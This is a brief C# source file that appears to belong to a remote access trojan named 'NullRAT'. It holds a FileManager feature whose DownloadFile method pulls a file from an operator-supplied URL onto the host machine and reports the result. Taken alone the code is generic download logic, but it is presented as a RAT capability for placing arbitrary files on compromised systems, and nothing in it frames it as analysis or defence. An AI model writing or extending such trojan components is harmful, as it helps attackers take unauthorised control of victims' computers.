using System;
using System.Net;

namespace NullRAT.Features
{
    public static class FileManager
    {
        public static string DownloadFile(string url)
        {
            try
            {
                string fileName = url.Substring(url.LastIndexOf('/') + 1);
                using WebClient wc = new WebClient();
                wc.DownloadFile(url, fileName);
                return $"Downloaded: {fileName}";
            }
            catch (Exception ex)
            {
                return $"Download failed: {ex.Message}";
            }
        }
    }
}